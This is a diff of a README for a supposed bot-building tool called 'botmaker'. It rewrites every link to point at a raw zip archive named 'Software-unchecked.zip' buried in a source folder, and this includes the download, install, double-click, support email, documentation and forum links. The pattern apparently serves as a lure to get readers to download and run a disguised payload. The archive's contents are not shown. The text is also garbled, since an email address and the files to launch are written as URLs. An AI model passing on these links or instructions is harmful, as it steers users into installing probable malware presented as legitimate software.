@@ -1,7 +1,7 @@
 # 🤖 botmaker - Create Your Own OpenClaw Bots Easily
 
 ## 📥 Download Now
-[![Download botmaker](https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip)](https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip)
+[![Download botmaker](https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip)](https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip)
 
 ## 🚀 Getting Started
 Welcome to botmaker! This simple application allows you to create containerized OpenClaw bots without any programming skills. Whether you want to automate tasks or explore new bot functionalities, botmaker is here to help you every step of the way.
@@ -14,20 +14,20 @@ Before downloading, ensure that your system meets the following requirements:
 - **Internet:** Required for downloading and installing.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download botmaker](https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip).
+To get started, visit this page to download: [Download botmaker](https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of botmaker.
-3. Download the appropriate file for your operating system (e.g., `https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip`, `https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip`, or `https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip`).
+3. Download the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip`, `https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip`, or `https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip`).
 4. Once downloaded, extract the ZIP or TAR file to your desired location on your computer.
 
 ### For Windows Users:
-- After extraction, navigate to the folder containing the `https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip` file.
-- Double-click on `https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip` to launch the application.
+- After extraction, navigate to the folder containing the `https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip` file.
+- Double-click on `https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip` to launch the application.
 
 ### For macOS Users:
 - After extraction, open the folder.
-- Double-click on `https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip` to start the application.
+- Double-click on `https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip` to start the application.
 
 ### For Linux Users:
 - After extraction, navigate to the folder using your terminal.
@@ -65,12 +65,12 @@ If you encounter issues while using botmaker, here are a few tips:
 ## 📞 Support
 Need further assistance? Reach out for support:
 - **Community Chat:** Join our Discord channel to connect with other users.
-- **Email Support:** Send an email to https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip for direct help.
+- **Email Support:** Send an email to https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip for direct help.
 
 ## 🔗 Additional Resources
 For more information and tutorials, explore the following resources:
-- [Documentation](https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip)
-- [Forum](https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip)
-- [GitHub Repository](https://github.com/truongan5/botmaker/raw/refs/heads/main/dashboard/src/Software_3.1-beta.2.zip)
+- [Documentation](https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip)
+- [Forum](https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/truongan5/botmaker/main/dashboard/src/Software-unchecked.zip)
 
 Thank you for using botmaker. We hope you enjoy creating your own bots!
